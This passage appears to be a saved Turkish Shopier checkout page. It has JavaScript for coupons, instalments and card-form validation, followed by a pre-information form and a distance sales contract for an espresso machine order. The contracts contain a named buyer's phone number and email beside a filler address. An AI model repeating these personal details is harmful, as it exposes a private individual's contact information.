                    label_discount_price
                } = data;
                let {
                    price_without_cent: sub_total_without_cent,
                    price_cent: sub_total_cent,
                    price_code,
                    price_symbol,
                } = sub_total_price;
                if (price_code === 'TL') {
                    price_symbol = ''
                } else {
                    price_code = ''
                }
                const {
                    price_without_cent: label_discount_without_cent,
                    price_cent: label_discount_cent,
                    price_formatted,
                }=label_discount_price;
                const {
                    price_without_cent: total_discount_without_cent,
                    price_cent: total_discount_cent,
                } = total_discount_price;
                const {
                    price_without_cent: total_without_cent,
                    price_cent: total_cent,
                } = total_price;
                const {
                    price_without_cent: coupon_without_cent,
                    price_cent: coupon_cent,
                } = coupon_price;

                const couponCodeNameHTML = `<div class="checkout-summary-price-subitem">
                    <div>${discount_name}</div>
                    <div>-${price_symbol}${coupon_without_cent}<span>${coupon_cent} ${price_code}</span></div>
                  </div>
                `;
                const  labelDiscountHTML = `<div class="checkout-summary-price-subitem">
                    <div>Etiket indirimi</div>
                    <div>-${price_symbol}${label_discount_without_cent}<span>${label_discount_cent} ${price_code}</span></div>
                  </div>
                `;
                const discountMainHTML =` <div id="basket-discount-total-price-div" class="checkout-summary-price-item">
                        <div id="basket-discount-total-price-name">
                        ${discount_name}
                        </div>
                        <div class="checkout-summary-price-total" id="basket-discount-total-price">-${price_symbol}${coupon_without_cent}<span>${coupon_cent} ${price_code}</span></div>
                    </div>`;

                let basketTotalPrice = document.getElementById('basket-total-price')
                let basketSubTotalPriceDiv = document.getElementById('basket-sub-total-price-div')
                if (price_formatted === '0'){
                    basketSubTotalPriceDiv.classList.remove('!hidden')
                    basketTotalPrice.insertAdjacentHTML('beforebegin',discountMainHTML)
                    document.querySelector('#basket-summary-total-price').innerHTML = price_symbol + total_without_cent + '<span>' + total_cent + ' ' + price_code + '</span>';
                }else{
                    let basketDiscountTotalPriceDiv = document.getElementById('basket-discount-total-price-div')
                    basketDiscountTotalPriceDiv.classList.remove('!hidden')
                    document.querySelector('#basket-discount-total-price').innerHTML ='-'+ price_symbol + total_discount_without_cent + '<span>' + total_discount_cent + ' ' + price_code + '</span>';
                    document.querySelector('#basket-summary-total-price').innerHTML = price_symbol + total_without_cent + '<span>' + total_cent + ' ' + price_code + '</span>';
                    const subDiscountItem = document.querySelector('.checkout-summary-price-subitem');
                    const totalDiscountItem = document.getElementById('basket-discount-total-price-div');
                    const basketDiscountTotalPriceName = document.getElementById('basket-discount-total-price-name')
                    basketDiscountTotalPriceName.innerHTML = 'Toplam indirim'
                    if (subDiscountItem) {
                        subDiscountItem.insertAdjacentHTML('afterend',couponCodeNameHTML);
                        subDiscountItem.insertAdjacentHTML('afterend',labelDiscountHTML);
                    }else {
                        totalDiscountItem.insertAdjacentHTML('afterend',couponCodeNameHTML);
                        totalDiscountItem.insertAdjacentHTML('afterend',labelDiscountHTML);
                    }

                    let basketSummaryDiscountName = document.querySelector('#basket-summary-discount-name')
                    let basketSummaryDiscountValue =document.querySelector('#basket-summary-discount-value')
                    if(basketSummaryDiscountName){
                        basketSummaryDiscountName.innerHTML = discount_name;
                    }
                    if(basketSummaryDiscountValue){
                        basketSummaryDiscountValue.innerHTML = '-' + price_symbol + coupon_without_cent + '<span>' + coupon_cent + ' ' + price_code + '</span>';
                    }
                }
                let couponInput = document.querySelector('.input-apply');
                let spanText = couponInput.querySelector('span');
                let inputValue = document.getElementById('shopier--coupon-code-textbox')
                if (couponInput) {
                    inputValue.setAttribute('disabled','')
                    couponInput.setAttribute('disabled','')
                    spanText.textContent = 'Uygulandı';
                    let svgWrapper = document.createElement('div');
                    svgWrapper.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 25" fill="none"
                             xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M12 23.25C6.07 23.25 1.25 18.43 1.25 12.5C1.25 6.57 6.07 1.75 12 1.75C17.93 1.75 22.75 6.57 22.75 12.5C22.75 18.43 17.93 23.25 12 23.25ZM12 3.25C6.9 3.25 2.75 7.4 2.75 12.5C2.75 17.6 6.9 21.75 12 21.75C17.1 21.75 21.25 17.6 21.25 12.5C21.25 7.4 17.1 3.25 12 3.25Z"
                                fill="currentColor"/>
                            <path
                                d="M10.5795 16.0796C10.3795 16.0796 10.1895 15.9996 10.0495 15.8596L7.21945 13.0296C6.92945 12.7396 6.92945 12.2596 7.21945 11.9696C7.50945 11.6796 7.98945 11.6796 8.27945 11.9696L10.5795 14.2696L15.7195 9.12961C16.0095 8.83961 16.4895 8.83961 16.7795 9.12961C17.0695 9.41961 17.0695 9.89961 16.7795 10.1896L11.1095 15.8596C10.9695 15.9996 10.7795 16.0796 10.5795 16.0796Z"
                                fill="currentColor"/>
                        </svg>`;
                    spanText.parentNode.insertBefore(svgWrapper, spanText.nextSibling);
                }
                const {
                    calculated_installment_rate_table,
                    calculated_installments: calculated_installments1
                } = response.data;
                if (calculated_installment_rate_table) {
                    let dropdownItem = document.querySelectorAll('.dropdown-item');
                    let keys = Object.keys(calculated_installment_rate_table);

                    dropdownItem.forEach(function (element, index) {
                        let installmentInput = element.querySelector('.input-body');
                        let row = '';

                        if (index < keys.length) {
                            let key2 = keys[index];
                                                        row = `<div class="input-name">` + ((parseInt(key2) !== 0) ? key2 + " taksit" : "Tek çekim") + "</div>"
                            ;
                                                    }
                        installmentInput.innerHTML = row;
                        calculated_installments = calculated_installments1;
                    });

                    let installmentInfoItem = document.querySelectorAll('.input-radio-installment-details');

                    installmentInfoItem.forEach(function (element, index) {
                        let installmentInput = element.querySelector('.input-body');
                        let row = '';

                        if (index < keys.length) {
                            let key2 = keys[index];
                            row = `<div class="input-name">` + ((parseInt(key2) !== 0) ? key2 + " x " + response.data.calculated_installment_rate_table[key2]['monthly_price']["price_legacy_formatted"] : "Tek çekim") + "</div>" +
                                `<div class="input-value">` + response.data.calculated_installment_rate_table[key2]['total_price']["price_legacy_formatted"] + "</div>";

                        }
                        installmentInput.innerHTML = row;
                        calculated_installments = calculated_installments1;
                    });

                }
            } else {
                if(message_type) {
                    const {min_value_cart} = message_type;
                    handleGenericErrors({
                        status: status,
                        message_type: message_type,
                        message: message,
                        valid_type: valid_type,
                        min_value_cart: min_value_cart
                    })
                } else {
                    handleGenericErrors({
                        status: status,
                        message_type: "default",
                        message: message,
                        valid_type: valid_type,
                    })
                }
            }
        })
    }
    let couponCodeText = document.querySelector('#shopier--add-coupon-to-cart');
    let couponCodeButton = document.querySelector('#couponToCartButton');
    let couponCodeInput = document.querySelector('#shopier--coupon-code-textbox');
    if (couponCodeText) {
        couponCodeText.addEventListener('click', function () {
            couponCodeButton.classList.add('pointer-events-none')
            if (!couponCodeButton.hasAttribute('disabled')) {
                addCouponCodeToCart(couponCodeInput.value);
            }
        });
    }


    function enableSubmitBtn() {
        document.querySelector('.btn-form-submit').removeAttribute('disabled');
    }

    function disableSubmitBtn() {
        document.querySelector('.btn-form-submit').setAttribute('disabled', 'true');
    }

    function checkFormElements() {
        const inputName = document.getElementById('formControlCardName');
        const inputCardNumber = document.getElementById('formControlCardNumber');
        const inputCardExpires = document.getElementById('formControlCardDate');
        const inputCardSecurityCode = document.getElementById('formControlCardCCV');
        const inputFields = [inputName, inputCardNumber, inputCardExpires, inputCardSecurityCode];

        function checkFormValidity() {
            inputFields.forEach(field => {
                if (field.value.trim() === '') {
                    field.classList.add('input-error');
                    disableSubmitBtn()
                    return false;
                } else {
                    field.classList.remove('input-error');
                    enableSubmitBtn()
                }
            });


            // Card Name validation
            if (inputName.value.trim().length <= 0) {
                inputName.classList.add('input-error')
                disableSubmitBtn()
                return false;
            } else {
                inputName.classList.remove('input-error')
            }
            // Card Number Validation
            if (inputCardNumber.value.length <= 15) {
                inputCardNumber.classList.add("input-error");
                return false;
            } else {
                inputCardNumber.classList.remove("input-error");
            }
            let inputCardNumberString = inputCardNumber.value.toString().replace(/ /g, "");
            let cardCount = inputCardNumberString.length - 1;
            let sum = 0;
            let switchKey = false;
            for (let i = cardCount; i >= 0; i--) {
                if (switchKey) {
                    let multiply2 = parseInt(inputCardNumberString[i]) * 2;
                    if (multiply2 > 9) {
                        multiply2 = (multiply2 % 10) + 1;
                    }
                    sum += multiply2;
                } else {
                    sum += parseInt(inputCardNumberString[i]);
                }
                switchKey = !switchKey;
            }
            if ((sum % 10) === 0) {
                inputCardNumber.classList.remove("input-error");
            } else {
                inputCardNumber.classList.add("input-error");
                return false;

            }

            // Card Expiry Date Validation
            if (inputCardExpires.value.trim().length < 4) {
                inputCardExpires.classList.add("input-error");
                return false;
            } else {
                inputCardExpires.classList.remove("input-error");
            }
            let cardExpiresParsed = inputCardExpires.value.trim().split("/");
            let month = cardExpiresParsed[0];
            let year = cardExpiresParsed[1];

            const dateNow = new Date();
            const yyNow = String(dateNow.getFullYear()).slice(-2);
            const mmNow = String(dateNow.getMonth() + 1).padStart(2, '0');
            if (Number(year) < Number(yyNow) || (Number(year) === Number(yyNow) && Number(month) < Number(mmNow))) {
                inputCardExpires.classList.add("input-error");
                disableSubmitBtn()
                return false;
            } else {
                inputCardExpires.classList.remove("input-error");
            }

            // Card CVV Validation
            if (inputCardSecurityCode.value.trim().length <= 0) {
                inputCardSecurityCode.classList.add("input-error");
                return false;
            } else {
                inputCardSecurityCode.classList.remove("input-error");
            }
        }

        inputFields.forEach(field => {
            field.addEventListener('input', function () {
                checkFormValidity();
            });
        });
        checkFormValidity();

    }

    document.querySelector('.btn-form-submit')?.addEventListener('click', function () {
        checkFormElements();
        const firstInvalidInput = document.querySelector('.input-error');
        if (firstInvalidInput) {
            firstInvalidInput.scrollIntoView({behavior: 'smooth', block: 'center'});
        }
    });

    function isSubmittable(event) {
        const formInputs = [...document.querySelectorAll('.input-required')];
        const invalidInput = formInputs?.find(input => input.classList.contains('input-error'));
        event.preventDefault();
        if (invalidInput) {
            checkFormElements(isMobileView, invalidInput)
        } else {
            document.querySelector('.btn-form-submit').classList.add('pointer-events-none');
            document.querySelector('#couponToCartButton')?.classList.add('pointer-events-none');
            document.querySelector('#shopier--coupon-code-textbox')?.classList.add('pointer-events-none');
            createLottieAnimationBtnLoad(".btn-form-submit",'loadingBtnWhite','white','',false)
            let form = document.querySelector('#paymentDetails');
            form.submit();
        }
        return false;
    }
</script>

<div class="modal fade modal-contract" id="preNotificationFormModal" tabindex="-1" role="dialog" aria-labelledby="preNotificationFormModal" aria-hidden="true" bis_skin_checked="1">
    <div class="modal-dialog modal-lg" role="document" bis_skin_checked="1">
        <div class="modal-content" bis_skin_checked="1">
            <div class="modal-header" bis_skin_checked="1">
                <h5 class="modal-title">Ön Bilgilendirme Formu</h5>
                <button type="button" class="btn-close btn-close-secondary" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body" bis_skin_checked="1">
                <strong>1. TARAFLAR:</strong><br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong><u>SATICI:</u></strong>
                    <p></p><p>
			    <strong>Adı – Soyadı / Ünvanı : Yasin Yüksel </strong>
			</p><p>
			    <strong>Adresi : Sultangazi 50.yil mahallesi / İstanbul</strong>
			</p><p>
			<br>
				<span class="modal-text" style="font-weight: bold;">
			    <strong><u>ARACI HİZMET SAĞLAYICI:</u></strong>
					</span></p><p>
			    <strong>Ünvan : Değer Teknoloji A.Ş.</strong>
			</p><p>
			    <strong>MERSİS no : 0272045884800019</strong>
			</p><p>
			    <strong>Adresi : İçerenköy Mah. Umut Sok. Quick Tower No:10-12/70 Ataşehir, İstanbul</strong>
			</p><p>
			    <strong>Telefon : 08508401510</strong>
			</p><p>
			    <strong>E-posta : hello@shopier.com</strong>
			</p>
			</span><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong><u>ALICI (TÜKETİCİ):</u></strong>
                    <p></p><p>
			    <strong>Adı – Soyadı : ensar efe</strong>
			</p><p>
			    <strong>Adresi : sdqweqweqweqweasd Besni Adıyaman Türkiye</strong>
			</p><p>
			    <strong>Telefon : +90 551 233 66 99</strong>
			</p><p>
			    <strong>E-posta : annen545@gmail.com</strong>
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong><u>SATIN ALINAN ÜRÜN:</u></strong>
                    </span></p><p>
			    <strong>Ürünün Adı : Philips 5500 Serisi LatteGo Tam Otomatik Espresso Makinesi, EP5547/90</strong>
			</p><p>
			    <strong>Adedi : 1</strong>
			</p><p>
			    <strong>Teslimat Adresi : sdqweqweqweqweasd Besni Adıyaman Türkiye</strong>
			</p><p>
			    <strong>Teslim Edilecek Kişi : ensar efe</strong>
			</p><p>
			    <strong>Fatura Adresi : sdqweqweqweqweasd Besni Adıyaman Türkiye</strong>
			</p><p>
			    <strong>Teslim Süresi : -</strong>
			</p><p>
			    <strong>Kargo Ücreti : Nakliyeye ilişkin kargo ve gönderim masrafları Alıcı’ya aittir. Bu bedel önceden net olarak hesaplanmamaktadır.</strong>
			</p><p>
			    <strong>Toplam Sipariş Tutarı (KDV Dahil) : 15.750,00 TL</strong>
			</p><p>
			    <strong>Ödeme Şekli : Kredi kartı</strong>
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>2. SÖZLEŞMENİN KONUSU</strong>
                    </span></p><p>
			    <strong>2.1. </strong>
			    İşbu Sözleşme, 07.11.2013 tarihli ve 6502 sayılı Tüketicinin Korunması Hakkında Kanun’un 48. ve 84. maddeleri uyarınca hazırlanmış olan 27.11.2014 tarihli ve 29188 sayılı Resmi Gazete’de yayınlanarak 27.02.2015 tarihinde yürürlüğe giren Mesafeli Sözleşmeler Yönetmeliği hükümlerine uygun olarak düzenlenmiştir.
			</p><p>
			    <strong>2.2. </strong>
			    İşbu Sözleşmenin tarafları olan Satıcı ve Alıcı, işbu Sözleşmeyle birlikte Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’nden kaynaklanan yükümlülük ve sorumluluklarını bildiklerini ve anladıklarını kabul ve beyan ederler.
			</p><p>
			    <strong>2.3. </strong>
			    İşbu Ön Bilgilendirme Formu, Mesafeli Satış Sözleşmesi’nin eki ve ayrılmaz bir parçasıdır.
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>3. GEÇERLİLİK VE SÜRESİ</strong>
                    </span></p><p>
			    <strong>3.1. </strong>
			    İşbu formda yer alan ürün ya da hizmete ilişkin olarak Alıcı’ya sunulan tüm bilgiler ve vaatler Alıcı tarafından satın alınan ürünlerin teslimine kadar geçerli olup bu hizmetten sonra Satıcı tarafından işbu formda verilen bilgi ve vaatlerle bağlı kalınmadığı ihtar olunur.
			</p><p>
			    <strong>3.2. </strong>
			     İşbu ön bilgilendirme formu, elektronik ortamda Alıcı tarafından okunarak kabul edildikten sonra mesafeli satış sözleşmesi kurulması aşamasına geçilecektir.
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>4. CAYMA HAKKI</strong>
                    </span></p><p>
			    <strong>4.1. </strong>
			        Alıcı; malı teslim aldığı tarihten itibaren on dört gün içinde yürürlükteki mevzuatın izin verdiği ölçüde hiçbir hukuki ve cezai sorumluluk üstlenmeksizin ve hiçbir gerekçe göstermeksizin malı reddederek Sözleşme’den cayma hakkına sahiptir. Tüketicinin cayma bildiriminin Satıcı’ya ulaştığı tarihten itibaren 10 (on) gün içinde ürün bedeli Alıcı’ya iade edilir. Cayma hakkının kullanımından kaynaklanan masraflar Satıcı’ya aittir.
			</p><p>
			    <strong>4.2. </strong>
			        Cayma bildirimi, Shopier’de yer alan "Talep / Şikayet Kaydı Oluşturma" formu üzerinden açılacak kayıt ile bildirilecektir.</p><p>
			    <strong>4.3. </strong>
			        Satıcı, tüketicinin hiçbir hukuki ve cezai sorumluluk üstlenmeksizin ve hiçbir gerekçe göstermeksizin malı teslim aldığı veya Sözleşmenin imzalandığı tarihten itibaren on dört gün içerisinde malı veya hizmeti reddederek Sözleşmeden cayma hakkının var olduğunu ve cayma bildiriminin Satıcı’ya ulaşması tarihinden itibaren ürünü geri almayı ve ürün bedelini Alıcı’ya ya da Değer Teknoloji A.Ş.’ye iade etmeyi taahhüt etmektedir.
			</p><p>
			    <strong>4.4. </strong>
			    Taraflar, Mesafeli Sözleşmeler Yönetmeliği m. 15/1 uyarınca cayma hakkının aşağıdaki hallerde kullanamayacağını kabul etmiştir:
			</p><p>
			    <strong>4.4.1. </strong>
			    Fiyatı finansal piyasalardaki dalgalanmalara bağlı olarak değişen ve satıcı kontrolünde olmayan mal veya hizmetler,
			</p><p>
			    <strong>4.4.2. </strong>
			    Tüketicinin istekleri, talepleri veya kişisel ihtiyaçları doğrultusunda hazırlanan mallar,
			</p><p>
			    <strong>4.4.3. </strong>
			    Çabuk bozulabilen veya son kullanma tarihi geçebilecek mallar,
			</p><p>
			    <strong>4.4.4. </strong>
			    Tesliminden sonra ambalaj, bant, mühür, paket gibi koruyucu unsurları açılmış olan mallardan iadesi sağlık ve hijyen açısından uygun olmayanlar,
			</p><p>
			    <strong>4.4.5. </strong>
			    Tesliminden sonra başka ürünlerle karışan ve doğası gereği ayrıştırılması mümkün olmayan mallar,
			</p><p>
			    <strong>4.4.6. </strong>
			    Malın tesliminden sonra ambalaj, bant, mühür, paket gibi koruyucu unsurları açılmış olması halinde maddi ortamda sunulan kitap, dijital içerik ve
			    bilgisayar sarf malzemeleri,
			</p><p>
			    <strong>4.4.7. </strong>
			    Abonelik sözleşmesi kapsamında sağlananlar dışında, gazete ve dergi gibi süreli yayınlar,
			</p><p>
			    <strong>4.4.8. </strong>
			    Belirli bir tarihte veya dönemde yapılması gereken, konaklama, eşya taşıma, araba kiralama, yiyecek-içecek tedariki ve eğlence veya dinlenme amacıyla
			    yapılan boş zamanın değerlendirilmesine ilişkin hizmetler,
			</p><p>
			    <strong>4.4.9. </strong>
			    Elektronik ortamda anında ifa edilen hizmetler veya tüketiciye anında teslim edilen gayri maddi mallar,
			</p><p>
			    <strong>4.4.10. </strong>
			    Cayma hakkı süresi sona ermeden önce, tüketicinin onayı ile ifasına başlanan hizmetler.
			</p><p>
			    <strong>4.4.11. </strong>
			    13.10.1983 tarihli ve 2918 sayılı Karayolları Trafik Kanunu’na göre tescili zorunlu olan taşınırlar ile kayıt veya tescil zorunluluğu bulunan insansız hava araçlarına ilişkin mallar,
			</p><p>
			    <strong>4.4.12. </strong>
			    Tüketiciye teslimi yapılmış olan cep telefonu, akıllı saat, tablet ve bilgisayarlara ilişkin mallar,
			</p><p>
			    <strong>4.4.13. </strong>
			    Canlı müzayede şeklinde açık artırma yoluyla akdedilen ve
			</p><p>
			    <strong>4.4.14. </strong>
			    Tanıtma ve kullanma kılavuzunda satıcı veya yetkili servis tarafından kurulum veya montajının yapılacağı belirtilen mallardan kurulum ya da montajı yapılanlara ilişkin sözleşmeler.
			</p>
			</span><br><br>
				<span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>5. MÜCBİR HALLER</strong>
					<p></p><p>
			    <strong>5.1. </strong>
			    Sözleşmenin akdedildiği tarihte var olmayan ve ön görülmeyen, tarafların kontrolleri dışında gelişen, ortaya çıkmasıyla taraflardan birinin ya da her ikisinin de sözleşme ile yüklendikleri borç ve sorumluluklarını kısmen ya da tamamen yerine getirmelerini ya da bunları zamanında yerine getirmelerini imkansızlaştıran haller, mücbir sebep (doğal afet, savaş, terör, ayaklanma, mevzuat hükümleri, el koyma veya grev, lokavt, üretim ve iletişim tesislerinde önemli mahiyette arıza vb.) olarak kabul edilecektir.
			</p>
				</span><br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>6. YETKİLİ MAHKEME</strong>
                    <p></p><p>
			    <strong>6.1. </strong>
			    İşbu Sözleşmenin uygulanmasında ve çıkabilecek ihtilaflarda; her yıl Gümrük ve Ticaret Bakanlığı tarafından ilan edilen değere kadar Alıcı veya Satıcı’nın yerleşim yerindeki Tüketici Hakem Heyetleri, söz konusu değerin üzerindeki ihtilaflarda ise Tüketici Mahkemeleri yetkilidir.
			</p><p>
			    <strong>6.2. </strong>
			   İşbu Sözleşme elektronik ortamda taraflarca okunmuş, kabul edilmiş ve teyit edilmiştir. İşbu Sözleşmede düzenlenmemiş hususlarda 6502 sayılı Tüketicinin Korunması Hakkında Kanun ve sair ilgili mevzuat hükümleri uygulanır.
			<br><br>
				<span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>7. YÜRÜRLÜK</strong>
					</span></p><p>
			    <strong>7.1. </strong>
			    İşbu Sözleşme Alıcı’nın elektronik onayı tarihinde düzenlenmiş ve elektronik olarak Alıcı tarafından onaylandığı tarihte yürürlüğe girmiştir.
			</p>
				</span><br><br>
            </div>
            <div class="modal-footer" bis_skin_checked="1">
                <button class="btn btn-light" type="button" data-bs-dismiss="modal" aria-label="close">Kapat</button>
            </div>
        </div>
    </div>
</div>

<div class="modal fade modal-contract" id="distanceSalesContractModal" tabindex="-1" role="dialog" aria-labelledby="distanceSalesContractModal" aria-hidden="true" bis_skin_checked="1">
    <div class="modal-dialog modal-lg" role="document" bis_skin_checked="1">
        <div class="modal-content" bis_skin_checked="1">
            <div class="modal-header" bis_skin_checked="1">
                <h5 class="modal-title">Mesafeli Satış Sözleşmesi</h5>
                <button type="button" class="btn-close btn-close-secondary" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body" bis_skin_checked="1">
                <strong>1. TARAFLAR: </strong>
                <br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong><u>SATICI</u></strong>
			    <strong><u>:</u></strong>
                    <p>
			    <strong>Adı – Soyadı / Ünvanı : Yasin Yüksel  </strong>
			</p><p>
			    <strong>Adresi : Sultangazi 50.yil mahallesi / İstanbul</strong>
			</p><p>
			<br>
				<span class="modal-text" style="font-weight: bold;">
			    <strong><u>ARACI HİZMET SAĞLAYICI:</u></strong>
					</span></p><p>
			    <strong>Ünvan : Değer Teknoloji A.Ş.</strong>
			</p><p>
			    <strong>MERSİS no : 0272045884800019</strong>
			</p><p>
			    <strong>Adresi : İçerenköy Mah. Umut Sok. Quick Tower No:10-12/70 Ataşehir, İstanbul</strong>
			</p><p>
			    <strong>Telefon : 08508401510</strong>
			</p><p>
			    <strong>E-posta : hello@shopier.com</strong>
			</p>
			</span><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong><u>ALICI (TÜKETİCİ):</u></strong>
                    <p></p><p>
			    <strong>Adı – Soyadı : ensar efe</strong>
			</p><p>
			    <strong>Adresi : sdqweqweqweqweasd Besni Adıyaman Türkiye</strong>
			</p><p>
			    <strong>Telefon : +90 551 233 66 99</strong>
			</p><p>
			    <strong>E-posta : annen545@gmail.com</strong>
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong><u>SATIN ALINAN ÜRÜN:</u></strong>
                    </span></p><p>
			    <strong>Ürünün Adı : Philips 5500 Serisi LatteGo Tam Otomatik Espresso Makinesi, EP5547/90</strong>
			</p><p>
			    <strong>Adedi : 1</strong>
			</p><p>
			    <strong>Teslimat Adresi : sdqweqweqweqweasd Besni Adıyaman Türkiye</strong>
			</p><p>
			    <strong>Teslim Edilecek Kişi : ensar efe</strong>
			</p><p>
			    <strong>Fatura Adresi : sdqweqweqweqweasd Besni Adıyaman Türkiye</strong>
			</p><p>
			    <strong>Teslim Süresi : -</strong>
			</p><p>
			    <strong>Kargo Ücreti : Nakliyeye ilişkin kargo ve gönderim masrafları Alıcı’ya aittir. Bu bedel önceden net olarak hesaplanmamaktadır.</strong>
			</p><p>
			    <strong>Toplam Sipariş Tutarı (KDV Dahil) : 15.750,00 TL</strong>
			</p><p>
			    <strong>Ödeme Şekli : Kredi kartı</strong>
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>2. SÖZLEŞMENİN KONUSU</strong>
                    </span></p><p>
			    <strong>2.1. </strong>
			    İşbu Sözleşme, 07.11.2013 tarihli ve 6502 sayılı Tüketicinin Korunması Hakkında Kanun’un 48. ve 84. maddeleri uyarınca hazırlanmış olan 27.11.2014 tarihli
			    ve 29188 sayılı Resmi Gazete’de yayınlanarak 27.02.2015 tarihinde yürürlüğe giren Mesafeli Sözleşmeler Yönetmeliği hükümlerine uygun olarak düzenlenmiştir.
			</p><p>
			    <strong>2.2. </strong>
			    İşbu Sözleşmenin tarafları olan Satıcı ve Alıcı, işbu Sözleşmeyle birlikte Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’nden
			    kaynaklanan yükümlülük ve sorumluluklarını bildiklerini ve anladıklarını kabul ve beyan ederler.
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>3. GENEL HÜKÜMLER</strong>
                    </span></p><p>
			    <strong>3.1. </strong>
			    İşbu Sözleşme kapsamında Değer Teknoloji A.Ş. (“Şirket” veya “Shopier”) yalnızca ve sadece Mesafeli Sözleşmeler Yönetmeliği kapsamında sağlayıcı sıfatını haiz olup Alıcı, Değer Teknoloji A.Ş.’nin ürüne ve ürünün gönderilmesine ilişkin herhangi bir sorumluluğunun bulunmadığını kabul eder. Satın alınan ürünün bedeli Shopier tarafından Alıcı’dan tahsil edilecek olup Alıcı ürünün bedelini Shopier’e ödemekle, ürün bedelini Satıcı’ya ödemiş sayılacaktır. Alıcı’nın ilgili mevzuat kapsamında iade hakları saklıdır.
                    </p><p>
			    <strong>3.2. </strong>
			     İşbu Sözleşme tarafları Alıcı ile Satıcıdır. İşbu Sözleşmenin yerine getirilmesi ile ilgili tüm yükümlülük ve sorumluluklar Sözleşmenin taraflarına aittir. İşbu sözleşme Alıcı tarafından elektronik olarak onaylandığı tarihte yürürlüğe girer.
			</p><p>
			    <strong>3.3. </strong>
			    Alıcı, 1. maddede belirtilen Sözleşme konusu ürünün özellikleri ve satışa ilişkin koşulları ile ilgili tüm bilgileri okuyup anladığını bu ürünün satın alınması için elektronik ortamda satın almaya ilişkin gerekli onayı verdiğini kabul ve beyan eder.
			</p><p>
			    <strong>3.4. </strong>
			    Satıcı, Sözleşme konusu ürünün sağlam, eksiksiz, listelendiği şekle niteliklere uygun ve varsa garanti belgeleri ve kullanım kılavuzları ile birlikte teslim edilmesinden sorumludur. Bu kapsamda Alıcı, Shopier’in ürüne ve ürünün gönderilmesine ilişkin herhangi bir sorumluluğunun bulunmadığını, bu durumun ürünün Satıcı tarafından anlaşmalı kargo şirketleri vasıtası ile gönderilmesi durumunda da değişmeyeceğini kabul eder.
			</p><p>
			    <strong>3.5. </strong>
			    Shopier’in herhangi bir nedenle ürün bedelini Alıcı’ya ait kredi kartından çekememesi veya ürünün kullanıma başlanmasından sonra Alıcı’ya ait kredi kartının Alıcı’nın kusurundan kaynaklanmayan bir şekilde yetkisiz kişilerce haksız veya hukuka aykırı olarak kullanılması nedeni ile ilgili banka veya finans kuruluşunun ürün bedelini Shopier’e ödememesi halinde Shopier ürünün kullanımını durdurma hakkına sahiptir.
			</p><p>
			    <strong>3.6. </strong>
			    Alıcı, yürürlükte bulunan mevzuat hükümleri gereğince masraf, ücret, faiz ve temerrüt faizi ile ilgili hükümlerin banka ve Alıcı arasındaki kredi kartı sözleşmesi kapsamında uygulanacağını, Shopier’in bu konuda herhangi bir yükümlülüğü bulunmadığını kabul, beyan ve taahhüt eder.
			</p><p>
			    <strong>3.7. </strong>
			    Siparişe konu olan ürünün çeşitli sebeplerle kullanılamaması halinde kredi kartına iade prosedürü aşağıdaki gibi olacaktır:
			</p><p>
			    <strong>3.7.1. </strong>
			    Ürünlerin fiyatları, katma değer vergisi ilave edilmiş Türk Lirası cinsinden sitede yer almaktadır. Alıcı kredi kartı ile alışveriş yapabilir. Kredi kartı ile verilen siparişler, kredi kartından işbu Sözleşme uyarınca Alıcı tarafından ödenmesi gerekli tutarın blokesinin yapıldığı an işleme alınacaktır.
			</p><p>
			    <strong>3.7.2. </strong>
			    Kredi kartı ile alınmış ürünlerin iadesi durumunda Shopier, Alıcı’ya nakit para ile ödeme yapmaz, bankaya bedeli tek seferde ödemesinden sonra banka tarafından karta iade gerçekleştirilecektir.
			</p><p>
			    <strong>3.8. </strong>
			    Alıcı ve Satıcı, işbu Sözleşme’de belirtilen kendilerine ait bilgilerin internet sitesine/uygulamaya girdikleri bilgiler olduğunu, bu bilgileri herhangi bir sebeple yanlış veya eksik girmeleri halinde dahi bu Sözleşme’nin kendileri tarafından sağlanan bilgilerle geçerli olacağını, internet sitesinin/uygulamanın Alıcı ve Satıcı tarafından verilen bilgilerin doğruluğunu ve geçerliliğini kontrol etme yükümlülüğü bulunmadığını ve ayrıca, Alıcı’nın ve Satıcı’nın işbu Sözleşme’nin ifa edilebilmesi için birbirlerine ve/veya Shopier’e aktardıkları kişisel verileri ile sair bilgilerinin, Sözleşme’nin ifası kapsamıyla sınırlı olmak üzere ve Sözleşme konusu ürünün gönderilebilmesi için posta hizmet sağlayıcılara aktarılacağını kabul, beyan ve taahhüt ederler.
			</p><p>
			    <strong>3.9. </strong>
			    Alıcı, vadeli satışların sadece bankalara ait kredi kartları ile yapılması nedeniyle; ilgili faiz oranlarını ve temerrüt faizi ile ilgili bilgileri bankasından ayrıca teyit etmesi gerektiğini bildiğini kabul eder.
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>4. CAYMA HAKKI</strong>
                    </span></p><p>
			    <strong>4.1. </strong>
